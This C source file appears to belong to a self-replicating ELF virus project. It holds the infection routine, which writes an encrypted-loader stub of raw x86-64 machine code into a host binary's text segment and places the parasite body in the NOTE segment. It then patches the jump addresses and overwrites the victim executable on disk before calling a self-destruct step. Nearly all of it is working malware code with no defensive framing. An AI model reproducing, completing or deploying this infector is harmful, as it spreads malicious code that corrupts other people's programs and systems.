#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void write_on_memory(char *dst, char *src, Elf64_Phdr **segment)
{
	const size_t beg_stub = (segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE;
	const size_t end_stub = PAGE_SIZE + STUB_SIZE;
	const size_t beg_parasite = (segment[DATA]->p_offset + segment[DATA]->p_filesz) - (beg_stub + end_stub);
	const size_t end_parasite = segment[NOTE]->p_filesz + (segment[NOTE]->p_offset - (segment[DATA]->p_offset + segment[DATA]->p_filesz));

	for (register size_t index = 0; index < beg_stub; index++)
		*dst++ = *src++;
	for (register size_t index = 0; index < end_stub; index++)
		*dst++ = '*';

	src += STUB_SIZE;

	for (register size_t index = 0; index < beg_parasite; index++)
		*dst++ = *src++;
	for (register size_t index = 0; index < end_parasite; index++)
		*dst++ = '*';
}

__attribute__((always_inline)) static inline void insert_stub(char *dst, Elf64_Phdr **segment)
{
	uint8_t stub[] =
	{
		0x55, 0x6a, 0x00, 0x53, 0x50, 0x57, 0x56, 0x52, 0x51, 0x41,
		0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41, 0x54, 0x41,
		0x55, 0x41, 0x56, 0x41, 0x57, 0xe8, 0x09, 0x00, 0x00, 0x00,
		0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x00, 0x5f,
		0xc6, 0x07, 0x2a, 0xc6, 0x47, 0x01, 0x2a, 0xc6, 0x47, 0x02,
		0x2a, 0xc6, 0x47, 0x03, 0x2a, 0xc6, 0x47, 0x04, 0x2a, 0xc6,
		0x47, 0x05, 0x2a, 0xc6, 0x47, 0x06, 0x2a, 0xc6, 0x47, 0x07,
		0x2a, 0xbe, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x15, 0xad,
		0xff, 0xff, 0xff, 0xb9, 0x42, 0x00, 0x00, 0x00, 0xe8, 0x05,
		0x00, 0x00, 0x00, 0xe9, 0xef, 0x00, 0x00, 0x00, 0x55, 0x48,
		0x89, 0xe5, 0x48, 0x81, 0xec, 0x88, 0x01, 0x00, 0x00, 0x49,
		0x89, 0xd1, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x46, 0x88,
		0x84, 0x04, 0x88, 0x00, 0x00, 0x00, 0x44, 0x89, 0xc0, 0x99,
		0xf7, 0xfe, 0x48, 0x63, 0xd2, 0x0f, 0xb6, 0x04, 0x17, 0x42,
		0x88, 0x44, 0x04, 0x88, 0x49, 0x83, 0xc0, 0x01, 0x49, 0x81,
		0xf8, 0x00, 0x01, 0x00, 0x00, 0x75, 0xd9, 0xba, 0x00, 0x00,
		0x00, 0x00, 0xbe, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x8d, 0x44,
		0x24, 0x88, 0x0f, 0xb6, 0xbc, 0x14, 0x88, 0x00, 0x00, 0x00,
		0x40, 0x0f, 0xb6, 0xc7, 0x01, 0xf0, 0x42, 0x0f, 0xb6, 0x34,
		0x02, 0x01, 0xf0, 0x89, 0xc6, 0xc1, 0xfe, 0x1f, 0xc1, 0xee,
		0x18, 0x01, 0xf0, 0x0f, 0xb6, 0xc0, 0x29, 0xf0, 0x89, 0xc6,
		0x48, 0x98, 0x44, 0x0f, 0xb6, 0x94, 0x04, 0x88, 0x00, 0x00,
		0x00, 0x44, 0x88, 0x94, 0x14, 0x88, 0x00, 0x00, 0x00, 0x40,
		0x88, 0xbc, 0x04, 0x88, 0x00, 0x00, 0x00, 0x48, 0x83, 0xc2,
		0x01, 0x48, 0x81, 0xfa, 0x00, 0x01, 0x00, 0x00, 0x75, 0xb2,
		0x85, 0xc9, 0x7e, 0x4a, 0x8d, 0x41, 0xff, 0x49, 0x8d, 0x7c,
		0x01, 0x01, 0x31, 0xd2, 0x31, 0xc0, 0x48, 0x83, 0xc0, 0x01,
		0x0f, 0xb6, 0xc0, 0x0f, 0xb6, 0x8c, 0x04, 0x88, 0x00, 0x00,
		0x00, 0x01, 0xca, 0x0f, 0xb6, 0xd2, 0x0f, 0xb6, 0xb4, 0x14,
		0x88, 0x00, 0x00, 0x00, 0x40, 0x88, 0xb4, 0x04, 0x88, 0x00,
		0x00, 0x00, 0x88, 0x8c, 0x14, 0x88, 0x00, 0x00, 0x00, 0x02,
		0x8c, 0x04, 0x88, 0x00, 0x00, 0x00, 0x41, 0x30, 0x09, 0x49,
		0x83, 0xc1, 0x01, 0x4c, 0x39, 0xcf, 0x75, 0xc2, 0x48, 0x81,
		0xc4, 0x88, 0x01, 0x00, 0x00, 0xc9, 0xc3, 0x41, 0x5f, 0x41,
		0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x41, 0x5b, 0x41, 0x5a, 0x41,
		0x59, 0x41, 0x58, 0x59, 0x5a, 0x5e, 0x5f, 0x58, 0x5b, 0x5b,
		0x5d, 0x5c, 0xe9, 0xba, 0xba, 0xfe, 0xca
	};

	const size_t patch_address = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz) - (sizeof(stub) - (ADDR_OFFSET + 0x4)));
	const size_t patch_size = ((void *)__exit - (void *)__entry) + FCNT_SIZE;
	const size_t patch_jump = segment[NOTE]->p_vaddr - ((segment[TEXT]->p_vaddr + segment[TEXT]->p_memsz));

	const size_t size = sizeof(int);

	_memcpy(stub + ADDR_OFFSET, &patch_address, size); 
	_memcpy(stub + SIZE_OFFSET, &patch_size, size);
	_memcpy(stub + (sizeof(stub) - 0x4), &patch_jump, size);

	_memcpy(dst + ((segment[TEXT]->p_offset + segment[TEXT]->p_filesz) - STUB_SIZE), stub, sizeof(stub));
}

__attribute__((always_inline)) static inline void insert_parasite(char *dst, Elf64_Phdr **segment)
{
	_memcpy(dst + segment[NOTE]->p_offset, __entry, segment[NOTE]->p_filesz);
}

//__attribute__((always_inline)) static inline void patch_entry_point(char *dst, const struct s_host *host)
//{
//	size_t offset = JUMP_SIZE;
//
//	dst += host->segment[NOTE]->p_offset + ((void *)execution - (void *)__entry);
//
//	while (true)
//	{
//		if (*(unsigned char *)dst == 0xe9)
//		{
//			dst++;
//			offset++;
//			break;
//		}
//		offset++;
//		dst++;
//	}
//
//	const size_t entry_point = host->entry[OLD] - (host->segment[NOTE]->p_vaddr + (((void *)execution + offset) - (void *)__entry));
//
//	_memcpy(dst, &entry_point, sizeof(int));
//}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void injection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);

#if LOGGER
	MID_LOGGER("injection:\t\t");
#endif

	if (context == FAILURE)
		goto label;

	char *ptr;
	int fd;

	const size_t filesize = host->segment[NOTE]->p_offset + host->segment[NOTE]->p_filesz;

	if ((ptr = _mmap(NULL, filesize, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
	{
		context = FAILURE;
		goto label;
	}

	write_on_memory(ptr, (char *)host->header, host->segment);
	insert_stub(ptr, host->segment);
	insert_parasite(ptr, host->segment);
//	decrypt_left(keychain, ptr + host->note->self->p_offset + ((void *)injection - (void *)__entry), (void *)autodestruction - (void *)injection);

	if ((fd = _open(host->filename, O_RDWR | O_TRUNC, 0000)) < 0)
	{
		context = FAILURE;
		goto label;
	}

	_write(fd, ptr, filesize);
	_close(fd);
	_munmap(ptr, filesize);
	_munmap(host->header, host->filesize);

label:
//	update_keychain_right(keychain, (char *)injection, (void *)autodestruction - (void *)injection);
//	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);

	autodestruction(host, keychain, context);
}
